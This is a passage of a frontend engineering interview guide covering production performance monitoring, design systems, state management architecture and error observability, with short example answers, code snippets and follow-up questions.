- How do you decide what to test with E2E vs integration tests?
- A test that worked yesterday is now flaky in CI. How do you approach debugging it?
</Accordion>

<Accordion title="54. Performance Monitoring in Production">
**Answer:**

Lab testing (Lighthouse, WebPageTest) tells you how your site *could* perform. Real User Monitoring (RUM) tells you how it *actually* performs for real users on real devices and networks.

**What to measure (the metrics hierarchy):**

1. **Core Web Vitals (user-centric):** LCP, INP, CLS -- reported to Google for ranking signals.
2. **Navigation Timing:** TTFB, FCP (First Contentful Paint), DOMContentLoaded, Load.
3. **Custom metrics:** Time-to-Interactive for specific features, API response times as perceived by the user, long task counts.

**RUM implementation:**

```javascript
// Web Vitals library (Google's official library)
import { onLCP, onINP, onCLS } from 'web-vitals';

onLCP((metric) => sendToAnalytics('LCP', metric));
onINP((metric) => sendToAnalytics('INP', metric));
onCLS((metric) => sendToAnalytics('CLS', metric));

// Custom metric: time to first search result
performance.mark('search-start');
// ... after results render
performance.mark('search-end');
performance.measure('search-to-results', 'search-start', 'search-end');
```

**RUM tools:**
- **Google's CrUX (Chrome User Experience Report)** -- Free, aggregated RUM data from Chrome users. Available in PageSpeed Insights, BigQuery, and the CrUX API.
- **web-vitals.js + your analytics** -- Self-hosted. Send to your own backend/data warehouse.
- **Commercial:** Datadog RUM, New Relic Browser, SpeedCurve, Sentry Performance.

**Alerting and dashboards:**
- Set alerts on P75 thresholds (not averages -- averages hide the tail).
- Dashboard: P50, P75, P95 for each Core Web Vital, segmented by device type, connection speed, geography.
- **Performance budgets in monitoring:** Alert when P75 LCP exceeds 2.5s, or when JS bundle size exceeds budget.

**Performance attribution:**
- **Long Animation Frames (LoAF) API** -- Identifies which scripts cause long frames that degrade INP.
- **Element Timing API** -- Measure when specific elements render (useful for tracking custom LCP-like metrics for below-the-fold content).
- **Server Timing header** -- Expose server-side timing breakdowns (`Server-Timing: db;dur=53, render;dur=112`) visible in DevTools.

**What interviewers are really testing:** Whether you've set up performance monitoring in production, not just run Lighthouse locally. The CrUX + custom metrics + alerting pipeline shows operational maturity.

**Red flag answer:** "We check Lighthouse scores." Lighthouse is a lab tool, not production monitoring. Not knowing about RUM or the `web-vitals` library.

**Follow-up:**
- What is the difference between lab data (Lighthouse) and field data (CrUX/RUM), and when do they disagree?
- How would you set up a performance regression detection system in CI/CD?
- Your P75 LCP worsened from 2.1s to 3.4s after a deploy. Walk me through your debugging process.
</Accordion>

<Accordion title="55. Design Systems and Component Libraries">
**Answer:**

A design system is the single source of truth for how a product looks, feels, and behaves. It encompasses design tokens, component libraries, documentation, and guidelines.

**Architecture layers:**

1. **Design Tokens** -- The atomic values: colors, spacing, typography, shadows, border radii. Represented as platform-agnostic data (JSON/YAML) and transformed into CSS variables, Tailwind config, iOS constants, Android resources.
   - Tools: **Style Dictionary** (Amazon), **Tokens Studio** (Figma plugin).
   - Example: `--color-primary-500: #3b82f6` -> consumed by CSS, React Native, iOS, Android.

2. **Core Components** -- Button, Input, Select, Modal, Tooltip, etc. Built with accessibility baked in (keyboard navigation, ARIA, focus management).
   - **Headless UI pattern** (Radix UI, Headless UI, React Aria): Components provide behavior and accessibility with zero styling. Teams apply their own design tokens/styles. This is the modern approach -- separating behavior from presentation.
   - **Styled component libraries** (MUI, Chakra, Mantine): Come with opinionated styling. Faster to start but harder to customize deeply.

3. **Patterns and Recipes** -- Composed layouts and page patterns: form layouts, card grids, navigation patterns. How components work together.

4. **Documentation** -- Storybook for interactive component demos. Guidelines for usage, do's and don'ts, accessibility requirements.

**Versioning and distribution:**
- **Monorepo** (Turborepo, Nx): All components in one repo with independent versioning per package.
- **Semantic versioning** with clear breaking change communication.
- **Changesets** for automated changelog generation and version management.
- **Chromatic / Percy** for visual regression testing on every PR.

**Adoption challenges:**
- **"Not invented here" syndrome** -- Teams build their own components instead of using the system.
- **Contribution model** -- Inner-source model where product teams contribute back. Dedicated design system team reviews and maintains quality.
- **Upgrade fatigue** -- Major version bumps create migration burden. Codemods and automated migration scripts reduce friction.

**What interviewers are really testing:** Whether you've built or contributed to a design system at scale, understanding the organizational and technical challenges. Mentioning headless UI, design tokens, and the contribution model shows depth.

**Red flag answer:** "A design system is a component library." It's much more than that. Not addressing versioning, distribution, or adoption challenges.

**Follow-up:**
- How do design tokens work across platforms (web, iOS, Android)?
- What is the headless UI pattern, and why has it become the preferred approach for design system component libraries?
- Your design system has low adoption. Teams are building their own buttons and modals. How do you drive adoption?
</Accordion>

<Accordion title="56. State Management Architecture">
**Answer:**

State management is one of the most over-engineered aspects of frontend development. The key insight is: **most apps don't need a global state management library.**

**The state hierarchy (reach for the simplest that works):**

1. **Local component state** (`useState`, `ref`) -- For UI state that belongs to one component: form values, toggle states, hover states. **This should be your default.**

2. **Lifted state** (parent component holds state for children) -- For state shared between siblings. Pass down via props. If prop drilling gets annoying (3+ levels), that's when you consider alternatives.

3. **Context** (`React.createContext`, Vue's `provide`/`inject`) -- For state that many deeply nested components need: theme, locale, auth status. **Not for frequently-changing state** -- every context value change re-renders all consumers.

4. **Server state** (TanStack Query, SWR, Apollo) -- For data from APIs. These libraries handle caching, background refetching, stale-while-revalidate, optimistic updates, and deduplication. **This eliminated 80% of Redux usage** -- most "global state" was actually server cache.

5. **Global client state** (Zustand, Jotai, Redux Toolkit) -- For truly global client-side state that changes frequently and is read by many components. Examples: shopping cart, notification queue, complex multi-step form wizard.

**Modern recommendations:**
- **Zustand** -- Minimal API, no boilerplate, works outside React components. The "just enough" solution.
- **Jotai** -- Atomic state model. Each piece of state is an independent atom. Great for fine-grained reactivity.
- **Redux Toolkit** -- If you need Redux (complex state machines, middleware, time-travel debugging), always use RTK, never raw Redux.
- **Signals** (Solid, Preact, Angular) -- Fine-grained reactivity without re-rendering entire component trees. The emerging paradigm.

**The over-engineering trap:**
Many teams put everything in Redux/Zustand when `useState` + TanStack Query would handle 95% of their needs. Signs you're over-engineering: putting form field values in global state, putting UI toggles in global state, using Redux for server data caching.

**What interviewers are really testing:** Judgment. Can you assess a codebase and recommend the right level of state management, not just the trendiest library?

**Red flag answer:** "We use Redux for everything." Or: "Global state is always bad." Both are dogmatic. Not distinguishing between server state and client state.

**Follow-up:**
- How did TanStack Query / SWR reduce the need for Redux in most applications?
- What are Signals, and how do they differ from React's state + re-render model?
- You join a project where the Redux store has 200 slices. Many contain API response data. How would you refactor this?
</Accordion>

<Accordion title="57. Observability and Error Monitoring">
**Answer:**

Production frontend applications need the same observability rigor as backend services. A crash in a user's browser is invisible unless you instrument for it.

**Error monitoring:**
- **Sentry** (industry standard), **Datadog RUM**, **LogRocket**, **Bugsnag**.
- **Source maps:** Upload source maps to your error monitoring service (but don't serve them publicly). This translates minified stack traces back to original source code.
- **Error boundaries (React):** Catch rendering errors and display a fallback UI instead of a white screen. Log the error to your monitoring service.
```jsx
class ErrorBoundary extends React.Component {
  componentDidCatch(error, info) {
    Sentry.captureException(error, { extra: info });
  }
  render() {
    if (this.state.hasError) return <FallbackUI />;
    return this.props.children;
  }
}
```
- **Global error handlers:**
```javascript
window.addEventListener('error', (event) => reportError(event.error));
window.addEventListener('unhandledrejection', (event) => reportError(event.reason));
```

**Session replay:**
- Tools like Sentry Session Replay, LogRocket, FullStory record user sessions (DOM mutations, clicks, scrolls, network requests).
- **Privacy:** Mask sensitive inputs, PII, and text content by default. Use `data-sentry-mask` or equivalent attributes.
- **Cost:** Recording every session is expensive. Record 10-100% with sampling. Always record sessions with errors at 100%.

**Frontend performance traces:**
- **Distributed tracing:** Connect frontend spans to backend spans. A user clicks "Submit" -> frontend creates a trace ID -> passes it to the API call via header -> backend continues the trace through services -> you see the full picture from click to database query.
- **OpenTelemetry for the browser:** `@opentelemetry/sdk-trace-web` provides browser-side tracing that integrates with backend observability.

**Alerting strategy:**
- Alert on error rate spikes (not absolute counts -- a deploy to 10% of users will have lower absolute errors but higher rates for affected users).
- Alert on new error types (errors never seen before after a deploy).
- Alert on Core Web Vitals regressions (P75 crosses threshold).

**What interviewers are really testing:** Whether you treat the frontend as a production system that needs monitoring, not a "client-side thing that's hard to observe." Mentioning source maps, session replay, and distributed tracing shows operational maturity.

**Red flag answer:** "We check the console for errors." Not having error monitoring in production. Not knowing about source maps.

**Follow-up:**
- How do you handle source maps in production -- uploading to Sentry without exposing them publicly?
- What is distributed tracing, and how do you connect a frontend click to a backend database query in your monitoring tools?
- A deploy goes out and your error rate triples. Walk me through your incident response process.
</Accordion>
